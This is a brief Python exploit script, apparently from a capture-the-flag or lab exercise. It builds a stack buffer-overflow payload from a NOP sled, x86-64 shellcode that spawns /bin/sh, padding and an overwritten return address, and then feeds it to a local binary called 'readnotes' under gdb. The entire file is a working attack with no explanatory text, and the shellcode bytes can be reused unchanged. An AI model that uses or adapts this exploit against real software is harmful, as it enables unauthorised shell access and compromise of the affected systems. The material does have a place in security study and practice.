import os
import subprocess

NOPSLED = "\x90"*40
BINSHELL = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
PAYLOAD = "A"*50
RET = "\x7f\xff\xff\xff\xe0\x90"[::-1]

string = NOPSLED + BINSHELL + PAYLOAD + RET

with open("shellcode.bin", "w+") as f:
	f.write(string)

f.close()

with open("file", "w+") as f2:
	f2.write("run $(cat shellcode.bin)")

f2.close()

subprocess.check_call(["gdb", "./readnotes", "--command=file"])
